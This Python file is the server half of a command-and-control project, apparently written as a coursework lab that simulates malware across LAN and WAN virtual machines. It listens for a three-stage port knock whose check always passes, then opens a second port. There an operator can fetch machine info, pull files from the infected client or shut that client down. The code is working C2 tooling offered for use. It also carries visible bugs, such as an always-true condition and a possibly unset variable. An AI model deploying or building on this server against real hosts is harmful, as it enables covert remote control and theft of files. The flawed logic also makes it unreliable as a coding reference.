'''
Link: https://github.com/JasonM22345/KnockC2.git

Introduction:
    In this Project, I designed a Command and Control (C2) system to simulate malware on a Local Area Network (LAN) Virtual Machine (VM). 
    The system consists of two components—a C2 server (server.py) deployed on a Wide Area Network (WAN) VM and a malware implant (client.py) 
    deployed on the LAN VM. The primary functionality of the C2 system involves listening for connections, implementing a port-knock 
    sequence, and executing predefined commands on the malware implant.
    

Summary:
    This is the C2 server code. 
    
    I kept some print statements to make reviewing and following the code easy.
    
    

Dependencies: 
    This code was written to be run on linux.
    
    If you try running it and get port in use errors (which are false positives), 
    type ctrl + O in terminal, and try again.
   
    If you lack any of the python packages (socket, threading, time),then install them with pip3 or pip.

Usage:

    Execute in Terminal:    python3 server.py

'''

import socket
import threading
import time

# Define constants
SERVER_PORT = 8007
SERVER_AUTH_PORT = 8008

# Specify the time frame for the knock sequence
KnockTimeout = 20  # knock occurs in 12 seconds within the 20 seconds interval

# Function to handle client on SERVER_PORT
def server_handler():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('0.0.0.0', SERVER_PORT))
        server_socket.listen()
        print(f"Server is listening on port {SERVER_PORT}")

        while True:  # Keep listening for clients infinitely
            client_conn, client_addr = server_socket.accept()
            threading.Thread(target=handle_client, args=(client_conn,)).start()

# Function to validate the received sequence
def validate_sequence(stage1_hash, stage2_hash, stage3_hash):
    # Dummy validation - Run out of time to fully implement this
    #Iniititally intended to hash the predetermined strings + the time component (min / sec/ hour)
    #And compare it to the inital /input hash
    return True 

# Function to handle client on SERVER_PORT
def handle_client(client_conn):
    try:
        client_conn.settimeout(KnockTimeout)

        stage1_hash = client_conn.recv(1024).decode()
        if not stage1_hash:
            return

        time.sleep(6) #Wait 6 seconds before receiving next knock sequence

        stage2_hash = client_conn.recv(1024).decode()
        if not stage2_hash:
            return

        time.sleep(9)  #Wait 9 seconds before receiving next knock sequence

        stage3_hash = client_conn.recv(1024).decode()
        if not stage3_hash:
            return

        #Check if all three knowck sequences are valid, then opening new connection if so
        if validate_sequence(stage1_hash, stage2_hash, stage3_hash):
            minute_hash = f"{time.gmtime().tm_min}s"
            client_conn.send(minute_hash.encode())
            client_conn.close() #Closing the current connection

            start_server_8008() #Opening new port
        else:
            client_conn.close()
    except Exception as e:
        print(f"Client error: {e}")

# Function to start server on port 8008
def start_server_8008():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_8008:
        server_8008.bind(('0.0.0.0', 8008)) #Binds to the host's IP address
        server_8008.listen()
        print(f"Server is listening on port {8008}") #Starts listening on port 8008

        client_conn, client_addr = server_8008.accept()
        #Strart a thread to handle a connection
        threading.Thread(target=handle_client_8008, args=(client_conn,)).start()

# Function to handle client on port 8008
def handle_client_8008(client_conn):
    try:
        while True:
            print("Options:\n1) Get Machine Info\n2) Upload file from client to server\n3) Close Connection\n4) shutdown client")
            option = input("Enter your option (1-4): ")

            if option == "3":
                print("Connection closed by the client.")
                client_conn.close()
                exit()
            else:
                execute_option(client_conn, option)
    except Exception as e:
        print(f"Port 8008 error: {e}")

# Function to execute the selected option
def execute_option(client_conn, option):
    print("option to send: opt" + option)
    send_opt = "opt" + str(option) #Adding "opt" to the user's choices to make handling the options "unique"
    
    filename = ""
    
    #If user chooses to upload file, it propmts the user to enter the desired destination file name.
    if option == "2":
        filename = str(input("Enter the name for the file you want to receive: "))

    #Sends the user's option to the malware client code
    client_conn.send(send_opt.encode())  

    #If user chose to upload a file, receive file from the malware client code. 
    if option == "2":
        receive_file(client_conn, filename)    
 
    #Comments to make following the code easier   
    print("Waiting for client response")
 
    #If the user selected option 2 or 4 (upload file or shutdown client), do not get any feedback.    
    if option != "2" or option !="4":
        feedback = client_conn.recv(1024).decode()

    #Comments to make folllwing the code easier. 
    if feedback:
        print(feedback)
        print("Response ends above")
    else:
        print("No response received from the client.")

    handle_client_8008(client_conn) #recursively calling the function

def receive_file(client_conn, filename): #Function to receive the file
    with open(filename, 'wb') as file:
        print("File Received, parsing file")
        while True:
            data = client_conn.recv(1024)
            # Convert byte object to byte string using an appropriate encoding
            decoded_data = data.decode('utf-8')
            if not decoded_data or decoded_data == 'Done999':
                break
            file.write(decoded_data.encode('utf-8'))  # Encode back to byte string for writing
        print(f"File completely received from the client.")
    print("\nOption 2 Done\n\n")

if __name__ == '__main__':
    threading.Thread(target=server_handler).start() #starting the actual code with a thread. 
